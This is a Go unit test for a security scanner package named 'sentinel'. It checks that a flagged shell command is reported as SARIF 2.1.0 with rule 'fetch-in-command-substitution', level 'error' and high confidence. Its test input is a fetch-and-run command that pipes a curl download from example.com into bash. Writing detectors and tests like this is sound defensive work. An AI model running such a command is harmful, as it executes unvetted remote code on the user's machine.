package sentinel

import (
	"encoding/json"
	"testing"
)

func TestSARIFReportShape(t *testing.T) {
	raw := SARIFReport("bash -c \"$(curl -fsSL https://example.com/install.sh)\"", []Finding{{
		Kind:       "fetch-in-command-substitution",
		Severity:   SeverityHigh,
		Confidence: ConfidenceHigh,
		Message:    "Remote content executed via command substitution",
	}})

	b, err := json.Marshal(raw)
	if err != nil {
		t.Fatalf("marshal SARIF: %v", err)
	}
	var doc struct {
		Version string `json:"version"`
		Runs    []struct {
			Results []struct {
				RuleID     string            `json:"ruleId"`
				Level      string            `json:"level"`
				Properties map[string]string `json:"properties"`
			} `json:"results"`
		} `json:"runs"`
	}
	if err := json.Unmarshal(b, &doc); err != nil {
		t.Fatalf("unmarshal SARIF: %v", err)
	}
	if doc.Version != "2.1.0" {
		t.Fatalf("unexpected SARIF version %q", doc.Version)
	}
	if len(doc.Runs) != 1 || len(doc.Runs[0].Results) != 1 {
		t.Fatalf("expected one SARIF run with one result")
	}
	if doc.Runs[0].Results[0].RuleID != "fetch-in-command-substitution" {
		t.Fatalf("unexpected rule id %q", doc.Runs[0].Results[0].RuleID)
	}
	if doc.Runs[0].Results[0].Level != "error" {
		t.Fatalf("unexpected level %q", doc.Runs[0].Results[0].Level)
	}
	if doc.Runs[0].Results[0].Properties["confidence"] != "high" {
		t.Fatalf("unexpected confidence property: %#v", doc.Runs[0].Results[0].Properties)
	}
}
